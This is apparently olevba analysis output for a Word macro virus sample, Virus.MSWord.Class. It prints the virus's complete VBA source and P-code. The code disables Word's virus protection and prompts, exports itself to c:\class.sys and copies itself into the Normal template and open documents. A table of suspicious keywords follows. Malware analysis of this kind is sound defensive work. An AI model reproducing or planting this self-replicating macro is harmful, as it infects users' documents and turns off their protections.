olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Class.bl
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Class.bl - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
'Andreas Marx25.12.99 21:08:53HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWvc_0000
On Error GoTo out
'Andreas Marx25.12.99 21:08:53HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWvc_0000
Options.VirusProtection = False
'Andreas Marx25.12.99 21:08:53HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWvc_0000
Options.SaveNormalPrompt = False
'Andreas Marx25.12.99 21:08:53HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWvc_0000
Options.ConfirmConversions = False
'Andreas Marx25.12.99 21:08:53HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWvc_0000
ad = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'Andreas Marx25.12.99 21:08:53HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWvc_0000
nt = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'Andreas Marx25.12.99 21:08:53HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWvc_0000
If nt > 70 And ad > 0 Then GoTo out
'Andreas Marx25.12.99 21:08:53HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWvc_0000
If nt < 70 Then
'Andreas Marx25.12.99 21:08:53HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWvc_0000
    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
'Andreas Marx25.12.99 21:08:53HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWvc_0000
    ActiveDocument.VBProject.VBComponents.Item(1).Name = host.Name
'Andreas Marx25.12.99 21:08:53HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWvc_0000
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\class.sys"
'Andreas Marx25.12.99 21:08:53HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWvc_0000
End If
'Andreas Marx25.12.99 21:08:53HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWvc_0000
If ad = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)
'Andreas Marx25.12.99 21:08:53HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWvc_0000

'Andreas Marx25.12.99 21:08:53HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWvc_0000
host.codemodule.AddFromFile ("c:\class.sys")
'Andreas Marx25.12.99 21:08:53HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWvc_0000
With host.codemodule
'Andreas Marx25.12.99 21:08:53HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWvc_0000
    For x = 1 To 4
'Andreas Marx25.12.99 21:08:53HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWvc_0000
    .deletelines 1
'Andreas Marx25.12.99 21:08:53HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWvc_0000
    Next x
'Andreas Marx25.12.99 21:08:53HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWvc_0000
End With
'Andreas Marx25.12.99 21:08:53HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWvc_0000
If nt < 70 Then
'Andreas Marx25.12.99 21:08:53HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWvc_0000
    With host.codemodule
'Andreas Marx25.12.99 21:08:53HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWvc_0000
    .replaceline 1, "Sub AutoClose()"
'Andreas Marx25.12.99 21:08:53HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWvc_0000
    .replaceline 91, "Sub ToolsMacro()"
'Andreas Marx25.12.99 21:08:53HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWvc_0000
    For x = 70 To 81
'Andreas Marx25.12.99 21:08:53HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWvc_0000
        .deletelines 62
'Andreas Marx25.12.99 21:08:53HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWvc_0000
    Next x
'Andreas Marx25.12.99 21:08:53HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWvc_0000
    .replaceline 35, "    For x = 1 To 4"
'Andreas Marx25.12.99 21:08:53HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWvc_0000
    End With
'Andreas Marx25.12.99 21:08:53HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWvc_0000
End If
'Andreas Marx25.12.99 21:08:53HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWvc_0000
With host.codemodule
'Andreas Marx25.12.99 21:08:53HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWvc_0000
    For x = 2 To 104 Step 2
'Andreas Marx25.12.99 21:08:53HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWvc_0000
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow
'Andreas Marx25.12.99 21:08:53HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWvc_0000
    Next x
'Andreas Marx25.12.99 21:08:53HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWvc_0000
End With
'Andreas Marx25.12.99 21:08:53HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWvc_0000
out:
'Andreas Marx25.12.99 21:08:53HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWvc_0000
If nt > 70 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'Andreas Marx25.12.99 21:08:53HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWvc_0000
End Sub
'Andreas Marx25.12.99 21:08:53HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWvc_0000
Sub ToolsMacro()
'Andreas Marx25.12.99 21:08:53HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWvc_0000
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Class.bl
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 12460 bytes
' Line #0:
' 	FuncDefn (Sub AutoClose())
' Line #1:
' 	QuoteRem 0x0000 0x004E "Andreas Marx25.12.99 21:08:53HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWvc_0000"
' Line #2:
' 	OnError out 
' Line #3:
' 	QuoteRem 0x0000 0x004E "Andreas Marx25.12.99 21:08:53HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWvc_0000"
' Line #4:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #5:
' 	QuoteRem 0x0000 0x004E "Andreas Marx25.12.99 21:08:53HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWvc_0000"
' Line #6:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #7:
' 	QuoteRem 0x0000 0x004E "Andreas Marx25.12.99 21:08:53HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWvc_0000"
' Line #8:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #9:
' 	QuoteRem 0x0000 0x004E "Andreas Marx25.12.99 21:08:53HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWvc_0000"
' Line #10:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	MemLd CountOfLines 
' 	St ad 
' Line #11:
' 	QuoteRem 0x0000 0x004E "Andreas Marx25.12.99 21:08:53HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWvc_0000"
' Line #12:
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	MemLd CountOfLines 
' 	St nt 
' Line #13:
' 	QuoteRem 0x0000 0x004E "Andreas Marx25.12.99 21:08:53HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWvc_0000"
' Line #14:
' 	Ld nt 
' 	LitDI2 0x0046 
' 	Gt 
' 	Ld ad 
' 	LitDI2 0x0000 
' 	Gt 
' 	And 
' 	If 
' 	BoSImplicit 
' 	GoTo out 
' 	EndIf 
' Line #15:
' 	QuoteRem 0x0000 0x004E "Andreas Marx25.12.99 21:08:53HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWvc_0000"
' Line #16:
' 	Ld nt 
' 	LitDI2 0x0046 
' 	Lt 
' 	IfBlock 
' Line #17:
' 	QuoteRem 0x0000 0x004E "Andreas Marx25.12.99 21:08:53HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWvc_0000"
' Line #18:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set host 
' Line #19:
' 	QuoteRem 0x0000 0x004E "Andreas Marx25.12.99 21:08:53HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWvc_0000"
' Line #20:
' 	Ld host 
' 	MemLd New 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemSt New 
' Line #21:
' 	QuoteRem 0x0000 0x004E "Andreas Marx25.12.99 21:08:53HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWvc_0000"
' Line #22:
' 	LitStr 0x000C "c:\class.sys"
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #23:
' 	QuoteRem 0x0000 0x004E "Andreas Marx25.12.99 21:08:53HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWvc_0000"
' Line #24:
' 	EndIfBlock 
' Line #25:
' 	QuoteRem 0x0000 0x004E "Andreas Marx25.12.99 21:08:53HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWvc_0000"
' Line #26:
' 	Ld ad 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set host 
' 	EndIf 
' Line #27:
' 	QuoteRem 0x0000 0x004E "Andreas Marx25.12.99 21:08:53HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWvc_0000"
' Line #28:
' Line #29:
' 	QuoteRem 0x0000 0x004E "Andreas Marx25.12.99 21:08:53HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWvc_0000"
' Line #30:
' 	LitStr 0x000C "c:\class.sys"
' 	Paren 
' 	Ld host 
' 	MemLd codemodule 
' 	ArgsMemCall AddFromFile 0x0001 
' Line #31:
' 	QuoteRem 0x0000 0x004E "Andreas Marx25.12.99 21:08:53HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWvc_0000"
' Line #32:
' 	StartWithExpr 
' 	Ld host 
' 	MemLd codemodule 
' 	With 
' Line #33:
' 	QuoteRem 0x0000 0x004E "Andreas Marx25.12.99 21:08:53HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWvc_0000"
' Line #34:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0004 
' 	For 
' Line #35:
' 	QuoteRem 0x0000 0x004E "Andreas Marx25.12.99 21:08:53HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWvc_0000"
' Line #36:
' 	LitDI2 0x0001 
' 	ArgsMemCallWith deletelines 0x0001 
' Line #37:
' 	QuoteRem 0x0000 0x004E "Andreas Marx25.12.99 21:08:53HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWvc_0000"
' Line #38:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #39:
' 	QuoteRem 0x0000 0x004E "Andreas Marx25.12.99 21:08:53HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWvc_0000"
' Line #40:
' 	EndWith 
' Line #41:
' 	QuoteRem 0x0000 0x004E "Andreas Marx25.12.99 21:08:53HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWvc_0000"
' Line #42:
' 	Ld nt 
' 	LitDI2 0x0046 
' 	Lt 
' 	IfBlock 
' Line #43:
' 	QuoteRem 0x0000 0x004E "Andreas Marx25.12.99 21:08:53HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWvc_0000"
' Line #44:
' 	StartWithExpr 
' 	Ld host 
' 	MemLd codemodule 
' 	With 
' Line #45:
' 	QuoteRem 0x0000 0x004E "Andreas Marx25.12.99 21:08:53HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWvc_0000"
' Line #46:
' 	LitDI2 0x0001 
' 	LitStr 0x000F "Sub AutoClose()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #47:
' 	QuoteRem 0x0000 0x004E "Andreas Marx25.12.99 21:08:53HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWvc_0000"
' Line #48:
' 	LitDI2 0x005B 
' 	LitStr 0x0010 "Sub ToolsMacro()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #49:
' 	QuoteRem 0x0000 0x004E "Andreas Marx25.12.99 21:08:53HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWvc_0000"
' Line #50:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0046 
' 	LitDI2 0x0051 
' 	For 
' Line #51:
' 	QuoteRem 0x0000 0x004E "Andreas Marx25.12.99 21:08:53HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWvc_0000"
' Line #52:
' 	LitDI2 0x003E 
' 	ArgsMemCallWith deletelines 0x0001 
' Line #53:
' 	QuoteRem 0x0000 0x004E "Andreas Marx25.12.99 21:08:53HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWvc_0000"
' Line #54:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #55:
' 	QuoteRem 0x0000 0x004E "Andreas Marx25.12.99 21:08:53HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWvc_0000"
' Line #56:
' 	LitDI2 0x0023 
' 	LitStr 0x0012 "    For x = 1 To 4"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #57:
' 	QuoteRem 0x0000 0x004E "Andreas Marx25.12.99 21:08:53HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWvc_0000"
' Line #58:
' 	EndWith 
' Line #59:
' 	QuoteRem 0x0000 0x004E "Andreas Marx25.12.99 21:08:53HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWvc_0000"
' Line #60:
' 	EndIfBlock 
' Line #61:
' 	QuoteRem 0x0000 0x004E "Andreas Marx25.12.99 21:08:53HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWvc_0000"
' Line #62:
' 	StartWithExpr 
' 	Ld host 
' 	MemLd codemodule 
' 	With 
' Line #63:
' 	QuoteRem 0x0000 0x004E "Andreas Marx25.12.99 21:08:53HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWvc_0000"
' Line #64:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0002 
' 	LitDI2 0x0068 
' 	LitDI2 0x0002 
' 	ForStep 
' Line #65:
' 	QuoteRem 0x0000 0x004E "Andreas Marx25.12.99 21:08:53HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWvc_0000"
' Line #66:
' 	Ld x 
' 	LitStr 0x0001 "'"
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	Ld Now 
' 	Concat 
' 	Ld Application 
' 	MemLd ActivePrinter 
' 	Concat 
' 	Ld Application 
' 	MemLd ActiveWindow 
' 	Concat 
' 	ArgsMemCallWith replaceline 0x0002 
' Line #67:
' 	QuoteRem 0x0000 0x004E "Andreas Marx25.12.99 21:08:53HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWvc_0000"
' Line #68:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #69:
' 	QuoteRem 0x0000 0x004E "Andreas Marx25.12.99 21:08:53HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWvc_0000"
' Line #70:
' 	EndWith 
' Line #71:
' 	QuoteRem 0x0000 0x004E "Andreas Marx25.12.99 21:08:53HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWvc_0000"
' Line #72:
' 	Label out 
' Line #73:
' 	QuoteRem 0x0000 0x004E "Andreas Marx25.12.99 21:08:53HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWvc_0000"
' Line #74:
' 	Ld nt 
' 	LitDI2 0x0046 
' 	Gt 
' 	Ld ad 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' 	EndIf 
' Line #75:
' 	QuoteRem 0x0000 0x004E "Andreas Marx25.12.99 21:08:53HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWvc_0000"
' Line #76:
' 	EndSub 
' Line #77:
' 	QuoteRem 0x0000 0x004E "Andreas Marx25.12.99 21:08:53HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWvc_0000"
' Line #78:
' 	FuncDefn (Sub ToolsMacro())
' Line #79:
' 	QuoteRem 0x0000 0x004E "Andreas Marx25.12.99 21:08:53HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWvc_0000"
' Line #80:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |MSWord.Class        |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

